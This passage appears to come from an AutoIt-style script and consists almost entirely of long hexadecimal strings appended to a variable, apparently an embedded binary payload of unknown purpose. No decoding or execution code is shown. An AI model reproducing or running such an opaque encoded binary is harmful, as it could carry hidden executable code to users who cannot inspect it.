832374143BDE73CA0646B01B8003DFC1C48DC072390B64FE7F49EF5D0FB6DEF48A55148454011D751E8B7E74268712D88B89F3008981A241041083502E456B3E1AFCF8951B829C0DE87E2E46807981567AAA89A7025E010B550D7B340FA0157042115D3D1038BA806F3291B20BD8A548FC6EA484509845C076502852062452587B7D37BAD0056DC25D55506AFF6004BAFEC93C07508D4424046461089C91A328FA10D8DCBE4A3A837C242C0C063B74762D1E020EBDFA8B0CB38982FC7CB304DE2904FE1768B301060F7B01114CEBB76D6DD8081CD1012A648B502819FC1F817904071C5160C1C1DFA8520C3951087505B54C51BB51236D1F2820EB0B115AC0FF021CC643446B0C55515058595D595B943F8185D2FFD0837C806EA293C8B25C7FDFF024371553581D6B1618A643210C533338094A10021B60C031BE0273FC83EE097A0300AF004C0731E9361053E2EB34531131647AC623BAC146CB0A60B741BA8000CE015BBFC4802B1AAB300156B1BE0BA9F60A090A6717FCA180D9EE6A16152459450276013148039225904E6BC075D204B4F402E9DD6931B5E83740FC6A50F4A8905A483BD86FD92AA4535E7538C91CFA207315FC7E205D48075E93A63980D4571DCCCF8C0B04990CACB8647803AF6513EA96E0BC32CE1D77B85D80024C7F3258E04883E004CB8D857600C3C0003A06C6790F4BF85841964601B8CE9B7E12065B0833FE112A83E8088138DD2EA460BA42CD0D"
    $sHex &= "533E14421BC035BA1F7513F06B0BACD1197F9CE4752E812D190837165F19BF5D19BE7F650C74CD568686D83BE13BCE761A79EB712050ADD2F4392A0E145109BF0E131B8D7886EB361240F59C5A2706081A2C099DC3C84675413683485D82648C102DC086B74ABCC0FE2573C1C2210C87411D564A07B84DB147FB62AD2DB372C0B806C65F0ACE073BC67465CF304CF1AC4C4E6AB8080B577826C0C62E546378414F7BBE20FC430DC2832B509ACE374BE236199F5FA8C0562E8F1E7D11C0D22874AC742310A500764A8AC975A1C99B80C75A79F641EBF0BB5AE0204DA342DBF460185457B4E4BE8A21D9034AEE6641D008F2E8F46AF66170C189472BA553A8BC15178B1AEE2460E402CB147E223214E18B76112C4938185840DEF683C95343DB179C142BC1483B0A7D01E8EE43BA2BBB5E743AACB8B4A7F0D2C00687CC0146379A234F9020B2064AAD80CF004520A9742306F0B8A45D2453A354A0412047E004C577A647F8B44FE18A8F7E43DF6C80E0BFF7BE72378D443F08606677131056E347907C8BC4241CC7CC7B59A41C5EEB11FE592409B160B28C858A0AD3CC5124945D6604A03E4F71D7ADA6F4E8E234D7A033EE4B16E3F22F70140E2E9E2241F10EC8BB5F4960A8E8E3F7450CF57429B3759069961C234D108FA7A3C09A0F561C1873A89ACA04DB8279727E457DF1390949F9474E16F43BF3746AC7064B070856D0EB1A838BF0D6C6C23BBC50418AC780816028872266221E5C824D7C0CEB061151B2201B99F9128A301A8791591E1C85777611AA4083E334D2541C303AF008149D6850A82855FB91691D0B0F1D78ECDC0FA9371AAC6E3B3402DB9C4267D1CA8C0F106F55B2F1E1E020C4E682D4A16CF72D2C78C550651F8C62B0DB95F6C07E3DA8E07738102B0C21977FFC3BFB74DDC707C7F8211483F7FF50B4D8666F33B1176F1857BBF4E304F760C661EB25388E3E5046789496822060ECF6F08365B83F6AF7DE1BF6237C55EA95C3AEE16355E36C5E0A643AC19612C4FF503F26E307320C39451883C68D65E05137965654D1E8097C765A6AC4329514280A3CC06283241ADB648050126055E0AD0060AA4EA9D1F5E8DBF957C578E3CC3A4EFA56D710BBCBAB56CD783551EB34F9EA7254E5E8E87FCF00794E9E1CC700E800180772A94C721820100CC09F834C18AB003C81FFF0A75251ADA8773477165088A1ED7469B03F503EC3A2CEEADC57E5DE7BD2123CE5311AC13CDDF0889E00DECBEB750497A7C81ABC1C071C936014291ABC1CB7D0E8E2216E473B8A1EA9103D76183C909947401B1C6E5C04DC7A23804E2A0E3EE974E0F3FC56C71C210F69EC0A7A2448F380E2F7843A1C3E88A50242AA81A43D13607CDF0E08E4E4E4E40C1014189393DB6D361D200F2428939393932C"
    $sHex &= "30341CA4CDA893383CC3402440C9C9C9ED440F484C507272C1C95458055C607272727264686C701E72727274787CB68049A61DA795841588269964928C909498996492499CA0A44D1DA726A8C12C3974A1D6AF6E358B06ACDF311B6760930423048DE3F92476083B3508595DF2B58B897E660C8B0C102EB95CF223101414189207975C181C1B1CE472C9E5202024240583C106CC013384B77519130078750D60A716020AEAC2381706DF3EAB0424EBF170262E37CDB7417A8A0635C6A373EE8B622A6280C1866E9F1FE4338422910CF18D46FF4D32457A93230C084E00060EFF254E411CB6987BFF518DE15709D86A2BC87403C11BC90BC12120C73E0E945C2B07A884FE0651EB07498038B2404298B1C048F5494EF81B058619292C1932A8020D05C0F8DAE8975C5A125DDC8E1C0DF0E8C40536C001B820501A574D0CF010058070E5A8C47919F001F041BDF47A7D107E262A1589B770453BD41455D2D77E1E245769B35F52278BD02A24EB120EFF7DE2B1DADA0A3F8D242A7CF47B2AF1A9E48C83F92EF9CF0E5978954EF1243BC875D6338007984CBA300E10A476B7EF4D1CD47408B20F859AEF55103707FFBB8058993BD00F8F6D021845046A03600830D6EBE9A0F354045ED0E08E8A4D2900E80272E09B25FC765A3EEE74D78A5001D0D08AB9FDE1FF0B3A0872043ACA76B140408875E8EBBD5A187E3886BD2F40C040C56BEFE66D0446E8828A0970080F3C73E30F86742879E1EBCEF968B0438788FA6A090BD6D2221D0068D4E284FF3EE21F283ABFC285DB7E40EFF3270A3A70F41BB4C7670372480E85C085C0E08D083C0179BC022702A7ACA800055C3ED13BDC6A1C92B0A005EE780279E41BC4E4DA8D697B7E42FF36481EC92FBD85FF745A85C0BD318E46901EBD85187487EF741725D4202BAEC44E295ED857C9E093610F47D859B98EF032C8AB447DC57D1C1C81502662AECEA8C2602B52BA3A3BD27450B3CC27DCA7D210DC56F40FD87966A709BE4A944118E41A095426F8FF0F1912ECF48A5B177DE48D89650F7605737CF0600E5F848EC8058781C8358D90C383C8721C1499B009A720208983222DAEC189C610078D724A9E0155D38E6F422E39148E6FD61AD4DA9A4B11109E15CF21D29142529393663FD245EAEEFF70082E2D5299519152A92B8F1BB1A5614A610141EBB7360AAFCA50D7ADEC02A1D978068A04079C1D3EE5B61B8519C7D9962B05614A1B6101BAF7D84C1FA74CC61CE75112E2EA2BF051CF4E46390784C104408339B40ADAB44EF756FC0450C3AD5C058C840A186A09EB0E43C291D8339487A14083103C198E752A46DA45A1A0FC799A0E043A208B42DC1D8027851891146EEC52E2BA8657C602243D56DD58596DF895987DEC3E40B8D17001BC4E385F0108"
    $sHex &= "30D8D3F3F8A185DAFB537BE14875DA8EC4A323C860C5C2492D792466681CA3B18623744AD3D513786460A08598FD2610568D6A8574DE8918F30CCC917F9E354CC3A24F4106FF52F0B42B36C0CFF84A858E725A597C526E4ABC58B44E8D34BE4D59C81DAC0428CCF912B673E18778BC90BCA01DF0474E594F63B3B85C9081FF9B6AD87EE7C57324B9AA582FE055EB4E2B5A1A0F4FE28D7D86DF8D6C9845C047020A8C36D853D7610B522B0CB2771F1B57B5BE1230020CB8899AAC338011A8A41930191D0EC94778462BEEB4041C6F40D1B6D23E98F8DC5C562F242E032B6F93F1FF5F6854C72BC60345EC881840F7D91BC9F7D123C8E04F43C19AD384834DF4FF6B0C6702772A25E14C2C9452F1FEAE12FBF0A645F4328FBC2B81E02153C128450C6A06E0747A68F468049E06EBF17C47ECE76805970A3DE45C0F96BBF74C6E487655B834D71040C17A5BA1D2D8E80CD08B0056EB78489DE6FA8A4DCCF6E00472188440D47694F0039DC05CB7546651090F9F3AA05474265ECBB34FB8080175589D0C30244B4864898445AC454F0FBD142635D8A99846C83BE8459C7E5B81FEA5538D44369E30F2C92FC774382D48DCA3E100E0743F94A81F0E0D54C3339354DBCD80DC55C7E47DE4390474D8EE063DE98D04364AE4ED561623F083C19D587F8B5DCC347DE9B95D1DD11C5343100CE97BD646EB3C60C8EB5B31A683B11170D47514004B1F80CDB2AA32569C3F08487B3DE52B445049D066D68586E0E0157D9E0BEE4AABC0400874C6D089014AC045C211E5C88D65C00B68C9E15F986C955201B3E25D1012D500F58A381405BD94533BE816D82374CBBF397510727D7C5581542660663958143FA008028E3E57F996FCE3E45930C0443B818108C27A143C495A316ED595AFFFAEF02207BA96B8033647FF4D508204B7DE0D062ACD2BF0BAB92F1DC61723BF042BC826D0FE1F3B4CA21E2500523BC8720A8BC159944B01EF34880424C32DD00E87878E853EE9413A0F0E23EA48F84115D1EA5DF5F1465643AB2230564062E28A9DC7011B440E1C55108DAECA3080C100C05B8D821B74107416F4395E2A3A8B01C1A9C1977C0AA0B6D1C6B7FFFFF644321D04741A408A103AD3743E0FB7C926D2C1E1080B2578FB05F20C750B48EB1D24D139550C3CAE096F0198B6083E66C2C70E628374E83F0EDB170EE957611540F1179447212C8DDCDAED568A48857032EF44B566C0297854A4E8F50959DDBB1499A71DC2CF13B4E80D8B81276C48188D5C8C2078818F106B04AA96B3DDA5E3425F5AF0C327C0388491661AA6B8318F0D68FE03FC885DFDC645FE15730FF20F21A4FCC645FD048D5507B6C9F1F86A03524E5451561C61D1313611D9A86FB69BCB70A9F4B632360A4DF91CC26A03700BC1A5AE0B78"
    $sHex &= "0857C11017D0F56F8D48BF83F91977119020BD9538741E95AF9FD0BB0031C4780BC9744D0310DFB4D2A2B741B35AB68703A6427F260AE48A077427F2239FF7FF6E263AE772063AE3770202E63AC712C3C63A826F038AE0D2A6D1B4D19F50601444B9047202F7D9C2BFADDA425BD7018D42FF5B40B0AB89C385640CF0C0491D87B8AC8B54E1D0EF36AF74158A0AFED7AC6037A0CF842E512975D89AB8BD62D8571CC1E31056108B0ABFBCD1C2DBEEC88BF733CB82F983F1FF9BB8FD4D04CF33C6700481E17181B2FB0A751C250D74D3400881E60B0AE803BA75C4FC8DA8263EC442FC3636C4EFD04D0804A4C852E7799E3680722415DC06797702FBD4EB965A6742FE6E0CFD0C1D5819FCFF258E509FFE7A6B58C11F8D401C62CD8BCA2D6B43C2F71B5A6A3A7C060A0B7C1F3C0434E93F851C8148AF694A01A23A102925BFA137D5103BD6E077907E0D7E04959B69477217044D5C55108944876645D98A480C1DFF481DD3D63E64ECF494F93FC7A62E9DD180E0B506DF5134E9F486C911EA095D43CB1E32837920E73FEF42F818B8C108505B510452AE08FFD137A48242CC226980F630AF0C40C727EB0F14704275AD082A2830AD76A00A53DFA77FF7DBA0327C21F61B7D1BE73C8D000776A80095FE06CA740EF618EB07EB059069EFA160FED8DF8B4040251F5CC1E6923C4D41305E3425ECC2DBE11EFD7E1A4A033CBE48413888768CF920A2C0EEB040320036EBE07042C324D31E739F44B86FF203F95B1F1AE22D0007FB8CD1E2921343145141BF624D601180076738C3E2CB805688FCF24030866F80482E517851B7C31F2E9BD1C1E1041442440A0C4B1CBC198E817DF8A2107F96BDFED86C9A144D63C07BFCB61FF899F600679369809A9B99C64D2534539FD4DA781B841578B73D5B847D1298F682465DA83D3BC1747502BC84371585D27E5EC60649EFDBEE437328318A91446E708855F72AF73CD4E01BBC28F75112FE9AAC4A3D145EF8EB4729FC829BB495D6C143FE781CB6F08E560E4CA0C026B24DEB1A40B5D2C0363955EB0DC60E5E44ABEB1F684C5EFFB5D1A4C3E0CE042A10C7741A109D2600FF4311534F1809BC4A0133471B8D4A041889BF3E4DADA45B7A6C0C1283C1EABD1BCA756E8BD87A280E0D865D04E2E451C001745745C90F860F06C0884A824C78D410BAAA045A3EDF513FF00F87F66BC928DC1CD4BE8A42132C01DE823DFC30884113DB1C6C223887E1207F9C0C7F4E552EE8511D0C14B35107D30A1848620B0088E96C2B1E1401219F6C5FFF475ED9E8DD5DF0DD055EC010F8DDAEDBFE771ADC5D08DFE0F6C4057A1A18F0DC31C84318B07B7B300D49EBD9329FD37F347731B7480201FD42020BC1A4A015BCFB668941021E3866E8201A4A4FA6E972EC7F48A24D65"
    $sHex &= "F31EA5665E222049B980DB4556CD4D11BF300357D720D3E2F7D882A3666C66997F741B0A1B14EEE74C7C06507E0F81E62F580D9BADEB71011D83D226FF0852F8910CDFB0784F8C639CF70167EC646CA03D0B520BE5928976F1FF7E103D1803C841260C161C14BDFA48246A0C5E9DF0572B2C5B7E50EBF9E821D302E10C16206A6482B658A1109F109CC2304F49DCDF2DCCEE04669E3B117D222475B1E80FD5043B8475114956AC50A7BA4D7A06F43206EB98EEC4041C1EF29FC3600EBC8908E74202C0CB6A01654114DB18F0482EDCA448F24E411C11942F3E0701420CFF8100F81256050CA0316B191EEAFC60188B037A0A13B04A6060EE66EB16CF75FA8EEE02FA0341E4BE14FC82151D9C893DDFE3345B49DF71300E6CF43080593952F71271240661D360D6AE5542103EB846E200203B361B201FDAD96DF9B074C66E10791BD627E17367629130845010649A6B4E2558881D6AF4828355D462A301BF0D2DC0DDE2FC02B8E06B055083C2CB76F0082CE5D209D96A797F6D0CB4BAB0760C459FA39BE870DFFB78B824C06B909039841A8B35159AE6CE1AFA0C157953B05CE1968E634A14020CECBA1702E270A8C417F8AA9EFC1ED810513A58B6E200DFE1023D99242129D552D93C87D00A4C032075131AC1EC973283E06D03B99184565F010375489C5C50E9A2825E7CCB57482F2CB290D802DD9CFBE89641B29452C050C39C8E7DE110B850354D735EDB56E52705359F421460E69DC3A1817C248941E440A6E40C0C1CC6D311F900A16C5E08838F838978FE49EEA0613A48B0D2F461B41CAA3E3C82E9018DF82A3884601E695BD57E1DABE5AB5BB126D3C6BF7F99E8E7F7915671740E0A72741A73740B23CFBE910AB307EE08EB191114EB1020625BC7C8EB07288F9F705AC05C7C3A6BC983EDF02A3C022066B4144820ACCA34688E522351CCA25A87B9F0B942AED2BBE0409AA3FF8A88C64FA4CA404ECDA23E4480AB40D31FC0BDF0FF1F11A013CD363951047DD4ED01BE1926C1E0C3510444020C248E66AA80755402D39F7870C00ABF33F51F78484FB67CACB2C11AE3E602C4FC06F0BC37F8C0B572BF0B185D84B496F600F7D940FA5F40B8F846F7681A7F06AB0A6104302371AD024EF0DFBE7EAF47BA6196E906DEBE03772E5F7C21C2ACAFA49835E5BC79F28AD9EB2211C87DE5D4E5DC79DE9B3CE5E86A8106666F187211E378BF3833E58915BF8D4383E0F0AC23F214025AC8CA219EACF1FF757E69E609930C799D84426C6801D4606902F652060D04B46F989C19BC718CD1C1A315671C38C202D2EB33D6B081C6D4108844161BF2EC8D12FA03741529037515400152B40AA3253FD742E44EB8A8FFBEBB91171461F80084068B918D01DAA6F7C6825932013F7F753E3D9258515623"
    $sHex &= "4BD41AAB7B687443808ADBFCA77AA54C0DE86D1F9D6BC9809A74BF38986BD23866488AE0FDC3EFFC884C101DEBD29CC6421D005EC11A111EA53FB5760BC30D64E039C138FEA3A277DB39227D47277A18007CBC3C02272DF047E944895018FD4444C0D1E251427880B2F8330ED2652C9608A64CF6036B58D59CF95F094F3FC38425C70240420F55A3832398A68626F8F96BBF56B777057C0FF74A0481052DE228017C1CB167F689BAD62B443989148169A9939AE3EBDE4D188010821867F691047D011F4F2FE8411F88B457DAD00157160F2D20ED156CC6BBC609888AA851189F58829B70102504A5723E23583DBD9B69A51F800A5F0D57481CF43C0B70E7E51477AA1A6651140C80DC5E848714F00C864CD2F0F036C5922346DF12EF3B05D8EA0831BE02307412E27B49D3114E22EBCE15028C3E72119F08C645FB6376CDF0AA6278F075BE08EC1AE257CF3E3884C1E2082781E1FF852318DDA181D22803D0AE01159EBD42DA72616863E8966100B45FC86FA9A222626F6C7478657447A65DB07D627518B855FB6663740910454DFBEFF7F86575064662EB5F406C616572750F2E4DF94D6EDE976365EB47706166750F86BDBBBB2F2FA1756F642E8F2F1705091B2CEA7800EEB0BFF07B746E69002D64EB52A8B78A1487D69160DF9B1B03E6A62994FC08017DE3C5ABC584828718CD0CB831E2DDAD54081497BFEC226CC49BB2C5DFEE63B88E882AC182C810512F94E6017FEA741BCD8C1FE10B098A08021D040FDC1AB4557F52ED6642E5410C75080A9D82232CAEE71B5D9F05F0BA4A574FA7A1A7B0970116347733C014E8E81A0FFB0CBB7D31D2411DBF58AB075683ECADC9EB04EBC5A05FEB85E5833D8966312886359A201846786212CF482DAC721E20B10FE4AD31BCAC4EEB1E3F58BE0339AA9C2E3B0CD70C6F2A39103B48DEE936A12B588C0FC53F85F630B4447DBF6A453B55E8401E029D7C4C3BC12A74B4FB2E3937D26085563737AF6265A2D69F1010015DE810F7673C5E2D67E26BA902681076E795E95A3E880401AA1485E309C6809238DBA9022F759F21BFFDD5028F3C1C0138E30C3B9B9DE3B7E27F20213C03E5413C3F2B1DF0D5097438AA2148FD1AF1A33FE548032B8950480D028DB0D8DFBF6C566281F5F115B67D6003DB3D6117BCC26090127CAD83FEEA08E81837F80A7D1605C2AA67C093FCC6414CEB228D17947091647C70E54778085481EC8A481580884A15540B5BBA7FEDF817DBD983117B9D481DEB1D7734DC6D93E9613B448A189F1D0218681E3C0DD9FD4C3CCBA5AED0257406C8A977710A132B972926AD2D7C11742BC13CB8209871F8B548C8500164101F18E1DE580CFD8B0C0140BB53175FB61489A054110C6970547C6FD24920440196D0FBF27324C22284"
    $sHex &= "30F80124ECB1AA060707194AA9F5AC9FD63FC9ADAC659575983EE1F705850A82F9F1886B66750AC43AC048C9783307388079AD2C40C7F5D902BD1D37BFB351518D0D789B833F95479C863C6012F8F8C08FF3007D183B1458A2E9B05D3A4D077C472C82DD9EEBD49F211756C54954549F3F3B58B883E183E20217B118E472240502F4F4F4F011A7B9F458C0754D59C9F163F8A154B25182E5D51D2E11387A8948EEE08444556E1087FC067954F02F5822142B5858612014FCFFEB9002F04C489A06C0144C5EF44A73C9E5F4F4F41CCB30F80BF2F07D0F646320707888CD89EBCC487C589680C0E08DB9088D440AB77195184E85DF0CBE0868AA5235354BE2F8226C474ED7D3B94FB64C901677D71A078A3C047F884115F081675A4D1741DFD3B23763CCD4097F1CD81F1CECA6678851F4E205744528E552A880760C78E13BD48771F4BF2F6002B809D5A178C15336F5094F802221954042869A08B530EF8152359B8B39871C4AF8D2A3C085FA1181FA98E9053501423C0B378ACDEC7435406253B35A8A699D83CEDF0349451A0881F99C9AEDDFD3A4B808D94C8A118855FF3A4587B65DE5FF3D840925512327AB027EFC725E3A0F87A66DF8B18389769CCC7C6DB3644ADC4119EC666474124072D2009C0C38F4F47CEF26F8F4EB704F654C5F4DF0C07D2C83F0AC4989732D049ACC8C61E8EB3BB9345543D84353481CE01B3E259E99C9649F7A8CEC0135122E4FEC00EC043DDBC18789401506B2C7EE3E6A3FEF1623062A5C000501010203308A30C02D04FF61ACF3F9BD9D740D46079AA6B9D74D5155DA2C280C87A22E4DAEB630C1DE0736D95423288A264F512DA0E4F8D45E5A0A807589E2CF760C837602EBE1DE5A4FE208BBB82670FA59ABDFFA03751D30422C761757116B02A6439F7A38B679E21A649AAF19288034772FFC667B69B3B2B4D87FB4CCA3026B0720B3B7DC93DACF7B0DCFB4B306A6C40002010683C38A591F571F2B3B48E001FC30957D47C9505F021B1B0844BAA307C114F934BC4C8EBC02B81810082045183136FF2BF608F33DC63D1A943510291866858A8B6C30411F32F017E0186F502C3B117EED09F8F1B24F2C835F4440435C22E51CF7040EC2ED4814DD0D682810992DFB36781F32C2AB1F1D747518DF1023FC36AFE0C210B64CEB6A3A25751166E5CB20792CA89C5381E8545EA39A91121098096DA81BF05D32112969511C024A7C22517D04B06496EA1DF6EB8E28366BD2E4428A441016808DFA32209A41010004CFD8FF373E4E18353F8F4C8B550202278920C38D08ADEA528D03C0A48FE8F872B91B1F016F2CA702C836E3EAC45F4A0F4C0DC021F55B14C51E049A71B7BCC9A9C48EC9C9BF6F6C0147DDB88EC8219BFFD02AAF4724170F8521251BF44E4778E2"
    $sHex &= "2489970BE41B62D9713B0CC183C6A0534323B34D0D1780B9392603796B06223F985C3A146AAF0611E002DFB828FF060B2B89BB813800074AE0E83A0F00F55CFFE126BEC1E6C0B89C6A96DA412C866BFDE594D87371C95F1B10293A1E0D5A523A224D7401AB93DF3847A9248C839236A6A379016F22D458D427C06A03E414756A1AD0B6B5F1481C3B4DDC1E0B550E67E735E0129A2BE42BBC8D756223F4EB40F412E11B84443B98E081C1FC0335AC4A1FEAE483D2C8CCBE10DBD5DD46D0367F217C1ECCAA147733CDA599174CC245D01C80A79E0880B4933391D484421EF48C3F18AF40BC805080FF45F1B662DDF0BA28B6F042D8B815B7540E0736FCE8892FA24DBBC8EB0B3FC874C8AA7C6FC2C74DDC1EF0A28D4C100414EC52C86C8B019740EC03269C7E2A3A782B4DD892C17710B4445314B10627AE8635637F81A69966D81813CA80D5EB2F00894218894ACE17C6152A543409BF5A0FEE04870BBD0442C530E31207CDF8BF4748248C480518092712EE37C6401E05EB3A78C020DCA31F008E1E01EB2907082006F97E05A61E02EB18650203059B81CCC833E71F03B17D69EF0A848A4E645681833F90112BC73A856D45D179BFB3C02AE00A79E34F708E0846FF0C142D181A123A01BF4F3CC8A933E0792C036F54E08DC28830BE90429E68BFB75130DA3CD41CED8841B3DFE081303B938111833B597848692C9CAB12DEF4710ADB44CADB61C85401BF18A65B38ED31BC049F1E7B612A505F14795162C1824E03A0095D6F1E2AB5E401DF207E0F6BC1F4160BE4579DAB84411F3E2202771E9EFB86F2360B902E911189A55ADB0A3F211F31026101E0E5AC8E8E41017C62D2E8610D3BD6FFB261019F42E4433DC759400387FA0AD7A31F0C7246839A7238FCE80CD1E8EB0C982369EAF89076195F283AFA03A3035BBF46DD0590A098EAFEB9F289F8ABC3F0D4450C047C2DD3D586C2C2CE1CE2A24DA0D0B505B8E01639D174099EECE4F4BE36F0548018BA99AF554BF5891DF2E4731542EBF529C0F7DA16F4F7D8B6E93A3FC170569E894DD898DC6F069CA6D8E86874EC007712DFDB8D9F72E87F778BA52E1572E4ED800B009E3EA93402D41C5A0E12AC14073C0FB6B39FEB782FFF7F04EFD2CEAC60814CCA0FFF2E05A91EBA2B48B8060D4131F07CE851A52A07328718DB9F81D726584000D25F03B020D70B3E2BBE1BD2AA01836EC7F88D44481F0953D4C0A94FB7820B7FE58D54D0DD1F7F0FEAD41F07E132D3E0232E2BD411681603E0232304C285BEE0851D1804ACA6EFBBA60442C701C59D7FCA299C66D2587FDBB948E1B3D50817419A419A0C0C104C469A419A144818346619545A1184661A3202A5C38A567D2E50F449345A345B38C7C808346C0F5FE0A1F300BD05E456C48E4E1407"
    $sHex &= "E2F8899DD804B31CDCD83A771764034229441036B0CD2C4070E318761C18AF9D302718BF89213A22C10C7B790CD70FA2A992461E09BCD3A92A0196EB880C2A7400B736034214FFCFDDB4B24291E85014DD881DBF89639D1A1774196908B617CB0A39148A74884468A5120C2AFF1364081813627E13BE5719824DDA98560C5F086D02B9080440EF242639AEBF635129010360C6022D8F7A61C67920D05F206F702AF010F81488BF81EC265E441D8A4C7508B93C96F690386CBD9EF3A51E0C5066A6A69A1833B572019C998438220834003E23DB4AB465B8C27D92894208F067F9888423C217380C1D364C0BEB820C6F0C1DDDFB03EE810B7389911764C040F82F5A688850685F0986FA32741F196885D20AC22AC2D79E88934D991F2E40E25FF012743833181C5C2F75982B1C17FCF13DF5A0679D33D23B4848DF22AD20B88BC2279FDF3E0751812D3268E341750FA1DEF400E01D204EEB29EB27838588F83D60213D315609F60AEB08DDD070F5525FC1302542B12C8AE9B5CA565126EE100129E5ED62D7111F241F209F6707F16A4115B20574310AF194068F156B3526C39F541F1516357E640F951B5F263E044C083121111062BF4B3C8EDA2A7E0275FF8B48FC7832120115DB408731AEB5400501C484234DC53C7624E80C038C06C23DDD8D0C429FE87A3812CE221CD9992A117EF899997C557AF061D3E284021AF5141441C2FBB316962BC2CDC1F90840886EDFBA6DF0F08A1A884801AB4A0C5051D116D8F1151C0C905EE4F4F7C0779837EB9CDCC1F8874DEC889B015EDF41033FECA756A92730037623884A5A1086B78BB0F6D3066BE88DB42B1CDD3711F9E30E2B1666AA70C38E911400DFDF435613AB61B0E5FF1A94101964965F5C7D099E4B0173159D0273AB1FAD4A14B614801A9710769746D0A911BF404A1CEBD29F6A5C0BAD4D6EE8450850419FE8A80BC9D8FD4125E1F16BA4BFAF81C2A012820047D887991CEEE5DFCC3150E92CBF569901C52A0D52A3A699B9E2A450E13903E0E249306F37FE4F092CA02E087F868C1D43683C60CAEB4EECF8EB1815B83340129F61DBE103128D144A9D4940DA1411F6D1740FFE334975CC710A6D84FF6932764C0E010BD123C213405E6733A6029F0C2E0273845A40AA51594478F4093C38F7F1834D02877A7C41EEF8FE5AAF2F83D14B5C3C8F60242670BFAD62F771205AA2BE9106C17C2585420885D0DFFB6790EBF2A59B08363248A609A25492FAB402C4320E63F44B38048CC63E12618CD3D0AD2C5210A82DC14934EABBFFDF82B0B984D14C6680F95130604A414C00882EAB86D150C9AE511095A6E80C1448F8F8CCC18CC242470958C6AC166C3375BFFF7C1D8E101A9B76974CC24CF045C0129F504A3B6856C406015917D0458E1869"
    $sHex &= "9A4D51553DDD3D1ED104C66A31E51B2680E01C388EBCE080B200C51A17564D1052A5DE974D5101A936B4BE4BC02063ED07ACF4796A91976F3F218B300767EC26091A038EDA17CA2A3D40209DC00571094DC16BE0FEC8F83B027D60249304E47527B9CD3B764C1DAA5DF43DCE131DE595F87E15420237B0D11A171496B04221DCC01860CFF839812B5D990AEB1EEB8D58D18A99BD79A202ABC23F8C13516222F2150CDD0B303B8D58FF51349E1590E6ADC23CFD1640086D54126658DFCF8251AB801D0251C40916A9E6DA900AB843560D8F66C6508707F00F141ABE061E5FDF7C0C58EC1E5D016F100F8DB171A27D43586070CE377D2218B003C801F3156610E861CEFE0E9D0C883B0C96731943668B873F5D8596E41AF5ECEB17CD0EE1A0DBF4301441666E1D0847C2D9824AEA8ADC663BC232121C4645E4044A1AAFC1095EDBF0237D1E1AC85605EF03F9E09024E8BB601C786CC56726143F0907481B6EF0B8F0D1E1B1036FBD51A85212F711B80446715F8DB9319226CC31F8100E98705D137EDD8252A139D813B915AB89F60A3BCA7D5C195B4850C0E5524E1326B0C2C1B4820186B4DFC4F9C1762A97F47320D1DFC1E81C9C7E76AC51120350DCE1FD81109811EB0F994846E0D1836AF897BCCC0F11F43036DAC2AD4C0E1118DB0E6C5A760F94C95F6A21C16B1A4CC4E80CD5FF561F357EA825FF1FBF69C07F5A324A05D8255F2F8F0E83979F03321114E28CE1C21D6DF01C79BA61109ADE0DABF42EA9E0403C2F3B7FECFBDEA5A204F0EAF004972DF0320FF658BB722DCD72CAD6CE2BDEAD8D1EC302F5C1E01861B01D3827DA1CAE03C21FBBDD92E600FFEA201E180345E01F88C358D0E5B805C1ADF926C0E11883258FE0C81F83E9D6BE8FE81F8FE8F43D01996E03C1983B171D3F76EA423B50825D6318DAF011BACC264A70210869932B3F141F0835D570F03F8BBE68AC5F09FB38027C1231345123A514CA573F179A8E1ABDAC512A745D1566CA3CDF58DF2D890FA8127C1D7FBF720BC05CA115DD885465FC26D4908CF58123918C16F085553F980EE8521F28267CAA2E2F7446990F181EA97A4C83F056DA560F7FE1784800764D554733121F051F034E2328FCC19D1800A6160B18294621C6BA26F0DFCC589DDA29FFDFEDE0C0A99F8094AD7F96B441323C5E90D6A101F99F0D8ABF3C86D3277F4F3B14EC2F0E25321A9F6000751129ADAAC738C82067143F18D82D63DF7FC545D0B919183F0C6F02AEB00C84CA0EF65D0BE774A71D812D3B4218730F21EFB9A7D066271D11E7725B3205BFA4B398A2B047C4099C635FB3B1E445440174F5B0332D4665FC5303752A3A4D0106080B9D07D9375952A688480933D2566620D24F89C2902888500A7FD0498F466315801486F906ECC873A0"
    $sHex &= "421CE07E1C331C113526B69B51F83F1DFC93BE86229F0CAB25B9F027E00DF0FC0A75100706E8B6D05128A10E064C7F30B88D0B56817C801F783D4816504C9BF00BCAB72A01F23A58E9126A0BBFDA45407C2E1050E02F0D4C1C0444A1738678592D519CB5DAC8A5DBA2940E8D2EBBBFC6E89037F9C57833700C1F3807D35CB8EB1A93A32CD6C308CA70D2C4B71045898578E245FA3BB88A58E316C619D28FC296C94D8367A14E834226BA3049B50FF294E7530A792E216B632FC383B060123FA6E18805448D0F672AB5CCA31ED31FBCDD9A304C1AD18911651DB9850EBC1CD16608956643666B08586E1002503E54019F288D45E8190EE89974A2039884137887094DE45E58006C260A1C0A50044C7F2BE005F18C2E1FD8731D500A2FE8EF62772B83C28D5F426360012880C0B7F022ED05B08B4A88481F1273E8BA5C08887B08BBD08610BB8547B12560D06285E857B74E83B3C1FC543C010CF8504A8ABEF05F2F86E101257D04C708A5C7626C25170314C481BE85CC20AA4A0EE0FE497E83E820C1E865441811A3B281231A011B7FAA7A02786A2C1EC05CAC0D5A45C1BF880BDD79FBF40A76712E50071DC4671CC48D14882B7486790BFC17E101121A6618E92E8CD659BB374A32087F480D38253C947F026829A4ADF4EDF10711E60F700F700F85810B8D274EE90F05A5037153390CA00F78BF8D0F23EB10962DF42AB6A1746C482554B84CD2B915212B7010704BC38D52AF2ADC1032DD97739DD31D178958B437DDFF3D7084EC6370EF9EB60317C60D745AAD8914BFA978E60F80638E2818E33E231E2575E88EE445B363803DFCDFC281F4678085ACCB81D57469A0087CFFC8253CDCDF102D98225E4863508528EA34CC07CA07ACACBF31B05FC2F71355B09BB02317A3455F5E2DB9E4BF40168B1FD801D0434F74481542CF46B4A222263B0E731AEFE96A61A3158718CD8D90A50D5A4D08EBE91DD7A6B263771BB1590B5099850C0AFB402658D29FE0AF10D6053C62C4AD7FEE062E06971C351326E02D5A32E2FBB4669648648203FAFD5F40222C4C9F6F0D1920D11666CAF535824D98861F203713E0A08370755D73571F3C63FC23DB188D540A24B9181CC299E221FA53A8BD1C131F9F4C07DAD4BC48C5F34D10F4A1EDF4302AE9D2281CA3BC044EAA98E4E411E40A87351E560FAFF7490757D090F41451BD221556DF2850AFB4FA2978CDF66D7D12FC01B5896EA801A667EC75EC24C7431303CB74603EA4E109614216CE80EC6EF1E06A04E8D843ECB64FB9126CC375278F7884